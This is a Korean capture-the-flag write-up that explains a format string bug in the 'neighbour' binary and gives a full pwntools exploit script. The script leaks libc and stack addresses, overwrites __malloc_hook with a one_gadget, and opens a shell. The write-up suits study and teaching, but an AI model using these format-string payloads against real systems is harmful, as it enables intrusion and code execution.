# 문제
***

neighbour 바이너리의 checksec 결과는 다음과 같다. 
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

file 명령어의 결과는 다음과 같다.
```
neighbour: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fedb3f3faea895f3fb4bb28804602fce6815e81e, stripped
```

바이너리 코드

__sub_937()__
```
void __noreturn sub_937()
{
    ...
    sub_8D0(stderr);
}
```

__sub_8D0()__ 
```
void __fastcall __noreturn sub_8D0(FILE *a1)
{
    while( fgets(format, 256, stdin) )
    {
        fprintf(a1, format);
            sleep(1u);
    }
    exit(1);
}
```

기능과 취약점은 매우 간단하다. fgets로 받은 입력을 fprintf를 통해서 stderr에 출력하는데 fprintf에 Format String Bug가 존재한다. <br/>

64bit의 경우 함수의 인자가 6개가 넘어가면 스택을 통해서 인자를 전달한다. 따라서 fprintf에 서식 문자를 5개 이상 넣으면 스택에 접근할 수 있다. <br/>

따라서 FSB를 이용해 스택에 있는 값을 변경하고 변경한 값을 참조해서 메모리의 특정 영역에 있는 값을 overwrite할 수 있다. <br/>

하지만 neighbour 바이너리는 FULL RERLO가 옵션이 설정되어 있기 때문에 got overwrite가 불가능하다. <br/>

fprintf는 출력하는 문자열의 길이가 길면 내부적으로 malloc을 호출한다. (malloc은 fprintf 함수에 의해 호출되는 vfprintf에서 호출됨) <br/>

GNU C library는 malloc, realloc, free에 hook을 제공한다. (이는 hook 값을 변경 가능하도록 하여 디버깅을 수월하게 할 수 있도록 하기 위함이다.) 위의 함수들은 호출되면 hook이 존재하는지 확인하고 만약 존재하면 hook에 저장되어 있는 값을 호출한다. 따라서 hook을 one_gadget으로 덮어쓰면 쉘을 획득할 수 있다. <br/><br/>

## exploit 방법
1. 스택에 존재하는 _IO_2_1_stderr_와 sfp를 통해서 libc와 스택 주소를 leak할 수 있다. 
2. libc leak을 통해서 __malloc_hook의 주소를 알아내고 스택에 __malloc_hook의 주소를 만든다. one_gadget과 hook에 저장되어 있는 값은 상위 4바이트 값이 동일하다. 따라서 하위 4바이트만 덮어쓰면 되는데 한 번에 4바이트 값을 덮어쓰면 fprintf에서 너무 많은 문자열이 출력되어서 fprintf가 터져버린다. 이를 방지하기 위해서 스택에 __malloc_hook 주소와 __malloc_hook+2의 주소를 만든다.
3. 스택에 만든 __malloc_hook 주소와 __malloc_hook+2의 주소를 참조해서 __malloc_hook의 값을 one_gadget의 주소로 덮어쓴다. (one_gadget의 constraint가 [rsp+0x70] == NULL이었는데 다행이 해당 위치에 NULL 값이 있었다.) 

<br/><br/>

c.f) remote 환경에서는 stderr에 fprintf를 하면 나에게 출력이 오지 않는다. 따라서 stderr를 stdout으로 바꿔줘야 한다. 방법은 다음과 같다. <br/>
stderr->_fileno가 2로 설정되어 있는데 이 값을 1으로 덮어써주면 stderr를 stdout으로 바꿀 수 있다. stderr->_fileno는 stderr + 112 에 위치하고 있다. (혁이꺼 블로그 참조)  
<br/>
이 문제에서는 stack에 stderr 값이 존재하기 때문에 이 값 (하위 1바이트 0x40으로 고정)에 112 (0x70)를 더해준 값을 해당 위치에 덮어쓴다. 이를 위해서 스택에 stderr를 가리키는 값을 만들어줘야 하는데 5 - 8 비트가 랜덤이어서 확률이 1/16이 된다.


<br/><br/>
__malloc_hook을 덮어쓰는 방법 외에도 fprintf ret 값을 one_gadget으로 덮어쓰는 방법이 있다. (혁이 방법은 libc의 stdin에 있는 _IO_jump_t vtable을 덮어쓰는 건데 이건 아직 잘 모르겠다...이 방법은 libc에서 vtable을 검증하는 IO_validate_vtable을 호출해서 dl_open_hook도 덮어줘야 한다는데...나중에 찾아보도록 하자ㅋㅋㅋ)
<br/><br/>
# 풀이
***
```
#!/usr/bin/python

from pwn import *
import time

file_path="/home/sungyun/round3/neighbour_c/neighbour"

def send_pay(pay):
	p.sendline(pay+"end")
	while "end" not in p.recv(0x1000):
 		pass

	print "send complete"

#p=remote("localhost",7777)
p=process(file_path,env={"LD_PRELOAD" : "/home/sungyun/round3/neighbour_c/libc.so.6"})
#libc=ELF("/home/sungyun/round3/neighbour_c/libc.so.6")

p.recvuntil("mayor.\n")

p.sendline("%12llx"*9)
p.recv(12*5)

stderr=int(p.recv(12),16)

p.recv(24)

stack=int(p.recv(12),16)-40
low2_stack=int(hex(stack)[10:],16)

#find with readelf -s command
#libc_base=stderr-0x3c2520  # libc_old_ver
libc_base=stderr-0x3c5540

#one_gad=libc_base+0xf24cb # constraint => [rsp+0x60] == NULL #libc_old_ver
one_gad=libc_base+0xf1147 # constraint => [rsp+0x70] == NULL
hi_one_gad=int(hex(one_gad)[6:10],16)
low_one_gad=int(hex(one_gad)[10:],16)

#malloc_hook=libc_base+0x3c1af0 #libc_old_ver
malloc_hook=libc_base+0x3c4b10
low_m_hook=int(hex(malloc_hook)[10:],16)
hi_m_hook=int(hex(malloc_hook)[6:10],16)

pay="%12llx"*7
pay+="%"+str(low2_stack-12*7)+"llx"
pay+="%hn"

send_pay(pay)

pay2="%12llx"*9
pay2+="%"+str(low_m_hook-12*9)+"llx"
pay2+="%hn"

send_pay(pay2)

pay3="%12llx"*7
pay3+="%"+str(low2_stack-12*7+64)+"llx"
pay3+="%hn"

send_pay(pay3)

pay4="%12llx"*9
pay4+="%"+str(low_m_hook-12*9+2)+"llx"
pay4+="%hn"

send_pay(pay4)

pay5="%12llx"*7
pay5+="%"+str(low2_stack-12*7+64+2)+"llx"
pay5+="%hn"

send_pay(pay5)

pay6="%12llx"*9
pay6+="%"+str(hi_m_hook-12*9)+"llx"
pay6+="%hn"

send_pay(pay6)

pay7="%12llx"*4
pay7+="%"+str(low_one_gad-48)+"llx"
pay7+="%hn"
pay7+="%12llx"*6

if hi_one_gad > (low_one_gad+72):
	pay7+="%"+str(hi_one_gad-(low_one_gad+72))+"llx"
else:
	pay7+="%"+str(0x10000+hi_one_gad-(low_one_gad+72))+"llx"

pay7+="%hn"

send_pay(pay7)

p.sendline("%1000000llx")  # fprintf use malloc when large input comes

p.interactive()
```

